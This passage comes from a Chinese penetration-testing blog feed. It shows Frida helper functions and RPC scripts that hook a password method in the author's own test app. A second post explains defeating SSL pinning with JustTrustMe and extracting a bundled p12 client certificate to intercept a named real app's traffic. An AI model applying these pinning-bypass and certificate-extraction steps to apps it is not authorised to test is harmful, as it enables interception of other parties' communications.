function_">charCodeAt</span>(o++), <span class="number">61</span> == c)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            c = base64DecodeChars[c]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; c == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>((<span class="number">15</span> &amp; a) &lt;&lt; <span class="number">4</span> | (<span class="number">60</span> &amp; c) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == h)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            h = base64DecodeChars[h]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; h == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (h == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>((<span class="number">3</span> &amp; c) &lt;&lt; <span class="number">6</span> | h)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印log</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">send</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节数组转hex字符串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToHex</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToBase64</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToString</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            tmp = (<span class="number">255</span> + tmp + <span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = tmp.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">byteToHexString</span>(<span class="params">uint8arr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!uint8arr) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> hexStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; uint8arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> hex = (uint8arr[i] &amp; <span class="number">0xff</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hex = (hex.<span class="property">length</span> === <span class="number">1</span>) ? <span class="string">&#x27;0&#x27;</span> + hex : hex;</span><br><span class="line">        hexStr += hex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hexStr.<span class="title function_">toUpperCase</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToUint8Array</span>(<span class="params">str</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> arr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, j = str.<span class="property">length</span>; i &lt; j; ++i) &#123;</span><br><span class="line">    arr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> tmpUint8Array = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(arr);</span><br><span class="line">  <span class="keyword">return</span> tmpUint8Array</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">str2arraybffer</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(str.<span class="property">length</span> * <span class="number">2</span>); <span class="comment">// 每个字符占用2个字节</span></span><br><span class="line">    <span class="keyword">var</span> bufView = <span class="keyword">new</span> <span class="title class_">Uint16Array</span>(buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, strLen = str.<span class="property">length</span>; i &lt; strLen; i++) &#123;</span><br><span class="line">        bufView[i] = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printBytes</span>(<span class="params">b</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> hexstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; b.<span class="property">length</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> uByte = (b[i]&gt;&gt;&gt;<span class="number">0</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">        <span class="keyword">var</span> n = uByte.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hexstr += <span class="string">&quot;0x&quot;</span> + (<span class="string">&quot;00&quot;</span> + n).<span class="title function_">slice</span>(-<span class="number">2</span>)+<span class="string">&quot;, &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hexstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字节数组转十六进制字符串，对负值填坑</span></span><br><span class="line"><span class="comment">// 二进制数据（包括内存地址）在计算机中一般以16进制的方式表示</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Bytes2HexString</span>(<span class="params">arrBytes</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrBytes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp;</span><br><span class="line">        <span class="keyword">var</span> num=arrBytes[i];</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//此处填坑，当byte因为符合位导致数值为负时候，需要对数据进行处理</span></span><br><span class="line">            tmp =(<span class="number">255</span>+num+<span class="number">1</span>).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmp = num.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        str += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会转成有符号的数字  JSON.stringify(bytes)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">HexString2Bytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> arrBytes = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line"><span class="comment">// 转成有符号的 10进制</span></span><br><span class="line"><span class="keyword">if</span> (v &gt; <span class="number">127</span>) &#123; v = v - <span class="number">256</span> &#125;</span><br><span class="line"><span class="comment">// end</span></span><br><span class="line">        arrBytes.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arrBytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jstring2Str</span>(<span class="params">jstring</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> ret;</span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="title class_">String</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">       ret = <span class="title class_">Java</span>.<span class="title function_">cast</span>(jstring, <span class="title class_">String</span>);</span><br><span class="line">   &#125;);</span><br><span class="line">   <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jbyteArray2Array</span>(<span class="params">jbyteArray</span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> ret;</span><br><span class="line">   <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;[B&#x27;</span>);</span><br><span class="line">       <span class="keyword">var</span> buffer = <span class="title class_">Java</span>.<span class="title function_">cast</span>(jbyteArray, b);</span><br><span class="line">       ret = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, buffer);</span><br><span class="line">   &#125;);</span><br><span class="line">   <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getParamType</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj == <span class="literal">null</span> ? <span class="title class_">String</span>(obj) : <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj).<span class="title function_">replace</span>(<span class="regexp">/\[object\s+(\w+)\]/i</span>, <span class="string">&quot;$1&quot;</span>) || <span class="string">&quot;object&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-Frida-RPC"><a href="#0x03-Frida-RPC" class="headerlink" title="0x03 Frida RPC"></a>0x03 Frida RPC</h1><h2 id="RPC主动调用"><a href="#RPC主动调用" class="headerlink" title="RPC主动调用"></a>RPC主动调用</h2><p><strong>rpc.exports导出名不可以有大写字母或者下划线</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 搜索HookedObject类实例</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found HookedObject:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// 查找到实例后主动调用方法</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ho.getPasswd():&quot;</span>, instance.<span class="title function_">getPasswd</span>(<span class="string">&quot;123 ABC&quot;</span>));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HookedObject: search complete.&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 测试函数 */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;I&#x27;m Frida_rpc.js!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 导出函数列表(可供py调用的) py函数映射和实际函数名 */</span></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">invokefunc</span>: invoke,</span><br><span class="line">    <span class="attr">testfunc</span>: test,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | script脚本信息交互函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Usb连接设备</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过ip:port 连接设备</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ 通过spawn方式启动 ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ 通过attach现有进程方式启动 ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 创建一个新脚本</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 加载信息交互handler函数</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line"><span class="comment"># 加载脚本</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter Command(y/t/n): &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;t&quot;</span>:</span><br><span class="line">        script.exports.testfunc()</span><br><span class="line">    <span class="keyword">elif</span> command==<span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="RPC动态修改"><a href="#RPC动态修改" class="headerlink" title="RPC动态修改"></a>RPC动态修改</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">getPasswd</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 需要发送给python的字符串：由函数的参数和结果拼接而成</span></span><br><span class="line">        <span class="keyword">var</span> string_to_send = <span class="variable language_">arguments</span>[<span class="number">0</span>] + <span class="string">&quot;:&quot;</span> + <span class="variable language_">this</span>.<span class="title function_">getPasswd</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">var</span> string_to_recv;</span><br><span class="line">        <span class="comment">// 发送到python程序</span></span><br><span class="line">        <span class="title function_">send</span>(string_to_send);</span><br><span class="line">        <span class="comment">// 同时调用.wait()来 阻塞运行，等待接收消息</span></span><br><span class="line">        <span class="title function_">recv</span>(<span class="keyword">function</span> (<span class="params">received_json_objection</span>) &#123;</span><br><span class="line">            <span class="comment">// 接收来的json字符串</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;recv in js:&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(received_json_objection))</span><br><span class="line">            <span class="comment">// 打印json的`my_data`,json串来自python</span></span><br><span class="line">            string_to_recv = received_json_objection.<span class="property">my_data</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv:&quot;</span>, string_to_recv);</span><br><span class="line">        &#125;).<span class="title function_">wait</span>();</span><br><span class="line">        <span class="comment">// 将接收到的字符串当作被hook函数的结果返回回去</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(string_to_recv);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## handler | script脚本信息交互函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)  <span class="comment"># 打印得到的信息</span></span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 输出的为`none`?</span></span><br><span class="line">    <span class="comment"># 如果`type`字段为&quot;send&quot; 则是js发来的消息</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="comment"># 打印json的`payload`内容(js发送过来的内容)</span></span><br><span class="line">        <span class="built_in">print</span>(message[<span class="string">&quot;payload&quot;</span>])</span><br><span class="line">        <span class="comment"># 向script发送消息，格式为字典</span></span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: <span class="string">&quot;Hello&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Usb连接设备</span></span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过ip:port 连接设备</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.104:8888&quot;</span>)</span><br><span class="line"><span class="comment">################ 通过spawn方式启动 ###########################</span></span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="comment">##### &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line"><span class="comment"># session = device.attach(&quot;com.forgotten.fridatestapp&quot;)</span></span><br><span class="line"><span class="comment">################ 通过attach现有进程方式启动 ###################</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./frida_rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 创建一个新脚本</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 加载信息交互handler函数</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line"><span class="comment"># 加载脚本</span></span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter `n` for leave: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;n&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> frida API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抓包之双向证书校验</title>
      <link href="/2024/07/07/%E6%8A%93%E5%8C%85%E4%B9%8B%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/"/>
      <url>/2024/07/07/%E6%8A%93%E5%8C%85%E4%B9%8B%E5%8F%8C%E5%90%91%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-双向证书校验"><a href="#0x01-双向证书校验" class="headerlink" title="0x01 双向证书校验"></a>0x01 双向证书校验</h1><p>双向认证，顾名思义，客户端和服务器端都需要验证对方的身份，在建立Https连接的过程中，握手的流程比单向认证多了几步。单向认证的过程，客户端从服务器端下载服务器端公钥证书进行验证，然后建立安全通信通道。双向通信流程，客户端除了需要从服务器端下载服务器的公钥证书进行验证外，还需要把客户端的公钥证书上传到服务器端给服务器端进行验证，等双方都认证通过了，才开始建立安全通信通道进行数据传输。而常规的https只是客户端校验服务端的证书验证服务器的身份。因此双向证书认证在一定程度上能增大中间人攻击的难度和我们抓包分析的难度。</p><p>下图为双向认证的流程图，如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071751744.jpeg" alt="img"> </p><h1 id="0x02客户端校验-VS-服务端校验"><a href="#0x02客户端校验-VS-服务端校验" class="headerlink" title="0x02客户端校验 VS 服务端校验"></a>0x02客户端校验 VS 服务端校验</h1><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>适用场景：如果服务器数量非常多、app版本众多，app在实现Https的策略上通常会采取客户端校验服务器证书的策略。</p><p>常见的校验方式：</p><ul><li>X509TrustManager校验</li><li>certificatePinner证书绑定</li><li>HostnameVerifier验证</li></ul><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><p>适用场景：比如银行、公共交通、游戏等行业，这种服务器高度集中、数量比较少，全国就那么几台、且app版本较少、对应用的版本控制的非常严格的时候，服务器就会对app的证书进行校验。</p><p>如果使用了服务端校验，也就是说app客户端一定是夹带了一张证书的。最常用的就是p12证书了。</p><p>获取到客户端携带的证书和证书密码，这样将证书导入进抓包软件，如Charles或burp中即可。</p><h1 id="0x03-密钥证书自吐实践"><a href="#0x03-密钥证书自吐实践" class="headerlink" title="0x03 密钥证书自吐实践"></a>0x03 密钥证书自吐实践</h1><p>服务端的校验：是需要服务端来校验客户端携带的证书摘要是否合法。。。</p><p>如果要绕过服务端校验，那么就需要<strong>获取客户端的证书和密钥</strong>。。。</p><p>这块以网上最常分析的soul 为例。</p><h2 id="1-绕过SSLPinning"><a href="#1-绕过SSLPinning" class="headerlink" title="1. 绕过SSLPinning"></a>1. 绕过SSLPinning</h2><p>直接使用xpose插件，安装JustTrustMe等这些插件，绕过SSLPinning。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071804790.png" alt="image.png"> </p><p>发现我们使用burpsuite、charles等抓包工具也只能抓到上行包</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071805143.png" alt="image.png"> </p><h2 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2. 服务端校验"></a>2. 服务端校验</h2><p>解决了服务器证书校验和ssl pining后，可以抓到上行包，但观察响应时，会发现服务器返回了400异常信息：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071806294.png" alt="image-20240707180621261"> </p><p>这个信息告诉我们，我们用了抓包工具以后发出去的包没有带上客户端证书，所以服务器端拒绝处理。</p><p>想要正常抓包，就必须导入客户端证书，同时需要输入证书密码。</p><h2 id="3-直接获取客户端证书"><a href="#3-直接获取客户端证书" class="headerlink" title="3. 直接获取客户端证书"></a>3. 直接获取客户端证书</h2><p>这就说明app使用了双向证书校验，也就是说app客户端一定是夹带了一张证书的。最常用的就是p12证书了。所以我们可以直接用apktool等工具反编译apk或者直接解压缩。证书这类文件通常放在assets目录下面，我们在里面找p12后缀名的文件即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407071806741.png" alt="image-20240707180652715"> 